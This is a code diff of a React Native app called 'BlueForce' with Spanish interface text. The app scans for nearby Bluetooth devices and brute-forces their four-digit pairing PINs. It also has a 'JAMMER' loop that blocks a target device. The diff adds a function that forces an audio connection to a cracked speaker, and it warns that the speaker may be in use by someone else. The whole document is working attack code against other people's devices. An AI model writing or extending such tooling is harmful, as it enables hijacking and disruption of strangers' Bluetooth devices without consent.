@@ -46,19 +46,6 @@ export default function App() {
     setHistory(prev => ({ ...prev, [mac]: { status, pin } }));
   };
 
-  const confirmAbort = () => {
-    return new Promise((resolve) => {
-      Alert.alert(
-        "CONFIRMACIÓN DE MANDO",
-        "¿Seguro que deseas ABORTAR la operación actual y liberar al objetivo?",
-        [
-          { text: "CANCELAR", onPress: () => resolve(false), style: "cancel" },
-          { text: "ABORTAR", onPress: () => resolve(true), style: "destructive" }
-        ]
-      );
-    });
-  };
-
   const scan = async () => {
     if (isScanning || mode !== 'IDLE') return;
     setIsScanning(true);
@@ -66,7 +53,7 @@ export default function App() {
     try {
       const devices = await RNBluetoothClassic.startDiscovery();
       setDiscoveredDevices(devices.sort((a, b) => b.rssi - a.rssi));
-      addLog("✅ Área escaneada.");
+      addLog("✅ Escaneo finalizado.");
     } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
     finally { setIsScanning(false); }
   };
@@ -74,22 +61,19 @@ export default function App() {
   const startBruteForce = async (device) => {
     setActiveTarget(device.address);
     setMode('BRUTE');
-    updateHistory(device.address, '⚔️ ATACANDO');
-    
     for (let i = 0; i <= 9999; i++) {
       let m; setMode(cur => { m = cur; return cur; });
       if (m !== 'BRUTE') break;
-
       const pin = i.toString().padStart(4, '0');
       setCurrentPin(pin);
       try {
         const ok = await RNBluetoothClassic.pairDevice(device.address, { pin });
         if (ok) {
           updateHistory(device.address, '🔓 CONQUISTADO', pin);
-          addLog(`🎯 OBJETIVO CONQUISTADO: ${pin}`);
+          addLog("🎯 ENCONTRADO PIN: " + pin);
           setMode('IDLE');
           setActiveTarget(null);
-          Alert.alert("ÉXITO", `PIN ENCONTRADO: ${pin}`);
+          Alert.alert("¡ÉXITO!", `Vínculo creado con PIN: ${pin}. Ya puedes usar Spotify o YouTube.`);
           return;
         }
       } catch (e) {
@@ -100,11 +84,23 @@ export default function App() {
     setActiveTarget(null);
   };
 
+  const syncAudio = async (device) => {
+    addLog(`🎵 Sincronizando Audio con ${device.address}...`);
+    try {
+      // Forzar conexión para perfil de audio (A2DP)
+      await RNBluetoothClassic.connectDevice(device.address);
+      addLog("🔥 AUDIO SINCRONIZADO. Pon tu música.");
+      Alert.alert("LISTO", "Canal de audio abierto. Abre YouTube o Spotify.");
+    } catch (e) {
+      addLog("⚠️ Reintento de sincronización...");
+      Alert.alert("AVISO", "Asegúrate de que el parlante no esté en uso por otra persona.");
+    }
+  };
+
   const startJammer = async (device) => {
     setActiveTarget(device.address);
     setMode('JAMMER');
-    updateHistory(device.address, '🚫 BLOQUEADO');
-    addLog(`🔥 JAMMER ACTIVO contra ${device.address}`);
+    addLog(`🔥 JAMMER activo contra ${device.address}`);
     while (true) {
       let m; setMode(cur => { m = cur; return cur; });
       if (m !== 'JAMMER') break;
@@ -113,45 +109,34 @@ export default function App() {
     setActiveTarget(null);
   };
 
-  const requestAbort = async () => {
-    const shouldStop = await confirmAbort();
-    if (shouldStop) {
-      setMode('IDLE');
-      setActiveTarget(null);
-      addLog("🛑 MISIÓN ABORTADA POR EL USUARIO.");
-    }
-  };
-
   const renderItem = ({ item }) => {
     const h = history[item.address] || { status: '⚪ NUEVO' };
-    const isThisActive = activeTarget === item.address;
+    const isConquered = h.status.includes('🔓');
     const isAnyActive = mode !== 'IDLE';
 
     return (
-      <View style={[styles.card, isThisActive && { borderColor: '#ff0055', borderWidth: 1 }]}>
+      <View style={styles.card}>
         <SignalMeter rssi={item.rssi} />
         <View style={{ flex: 1, marginLeft: 15 }}>
-          <Text style={styles.name}>{item.name || "DESCONOCIDO"}</Text>
+          <Text style={styles.name}>{item.name || "N/A"}</Text>
           <Text style={styles.mac}>{item.address}</Text>
-          <Text style={[styles.historyText, { color: h.status.includes('🔓') ? '#00ff88' : '#888' }]}>
-            {h.status} {h.pin ? `(PIN: ${h.pin})` : ''}
-          </Text>
+          <Text style={[styles.historyText, { color: isConquered ? '#00ff88' : '#888' }]}>{h.status}</Text>
         </View>
         <View style={{ flexDirection: 'row' }}>
-          <TouchableOpacity 
-            style={[styles.btnA, (isAnyActive && !isThisActive) && { opacity: 0.2 }]} 
-            onPress={() => startBruteForce(item)} 
-            disabled={isAnyActive}
-          >
-            <Text style={styles.btnText}>PIN</Text>
-          </TouchableOpacity>
-          <TouchableOpacity 
-            style={[styles.btnA, { backgroundColor: '#ff0055', marginLeft: 5 }, (isAnyActive && !isThisActive) && { opacity: 0.2 }]} 
-            onPress={() => startJammer(item)} 
-            disabled={isAnyActive}
-          >
-            <Text style={styles.btnText}>BLOCK</Text>
-          </TouchableOpacity>
+          {isConquered ? (
+            <TouchableOpacity style={[styles.btnA, { backgroundColor: '#00f2ff' }]} onPress={() => syncAudio(item)}>
+              <Text style={[styles.btnText, { color: '#000' }]}>AUD</Text>
+            </TouchableOpacity>
+          ) : (
+            <>
+              <TouchableOpacity style={styles.btnA} onPress={() => startBruteForce(item)} disabled={isAnyActive}>
+                <Text style={styles.btnText}>PIN</Text>
+              </TouchableOpacity>
+              <TouchableOpacity style={[styles.btnA, { backgroundColor: '#ff0055', marginLeft: 5 }]} onPress={() => startJammer(item)} disabled={isAnyActive}>
+                <Text style={styles.btnText}>BLOCK</Text>
+              </TouchableOpacity>
+            </>
+          )}
         </View>
       </View>
     );
@@ -159,15 +144,15 @@ export default function App() {
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>BlueForce Tactics</Text>
+      <Text style={styles.title}>BlueForce Command</Text>
       <View style={styles.main}>
         <Text style={styles.pin}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
-        <TouchableOpacity style={[styles.scanBtn, (mode !== 'IDLE' || isScanning) && { opacity: 0.3 }]} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
+        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
           {isScanning ? <ActivityIndicator color="#fff" /> : <Text style={styles.scanText}>ESCANEAR AREA</Text>}
         </TouchableOpacity>
       </View>
-      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} style={{ flex: 1 }} />
-      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={requestAbort}><Text style={styles.stopText}>ABORTAR MISIÓN</Text></TouchableOpacity>}
+      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} />
+      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.stopText}>ABORTAR</Text></TouchableOpacity>}
       <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.logText}>{l}</Text>)}</ScrollView>
     </View>
   );
@@ -175,9 +160,9 @@ export default function App() {
 
 const styles = StyleSheet.create({
   container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
-  title: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
+  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
   main: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
-  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 15, fontFamily: 'monospace' },
+  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 15 },
   scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
   scanText: { color: '#000', fontWeight: 'bold' },
   card: { backgroundColor: '#181818', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
@@ -188,7 +173,7 @@ const styles = StyleSheet.create({
   bar: { width: 3, marginRight: 2, borderRadius: 1 },
   btnA: { backgroundColor: '#222', paddingVertical: 8, paddingHorizontal: 12, borderRadius: 8 },
   btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
-  stop: { backgroundColor: '#ff0055', padding: 18, borderRadius: 12, alignItems: 'center', marginBottom: 15 },
+  stop: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 15 },
   stopText: { color: '#fff', fontWeight: 'bold' },
   logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
   logText: { color: '#444', fontSize: 9, marginBottom: 2 }
